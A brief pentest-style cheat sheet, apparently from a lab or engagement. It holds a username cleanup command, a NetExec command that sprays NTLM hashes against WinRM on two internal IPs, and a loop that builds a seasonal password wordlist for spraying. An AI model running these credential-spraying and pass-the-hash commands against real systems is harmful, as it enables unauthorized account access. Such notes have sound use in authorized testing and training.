```sh
awk '{print $1}' usernames.txt > cleanusers.txt
```

# Hash x Users Spray with nxc

```sh
nxc winrm 10.10.162.140 10.10.162.142 -u users.txt -H hashes.txt -t 100
```

# Generate SeasonYear! Wordlist

```sh
for season in Spring Summer Winter; do
    for year in 2023; do
        for special in "" "." "!"; do
            echo "${season}${year}${special}"
        done
    done
done > passwords.txt
```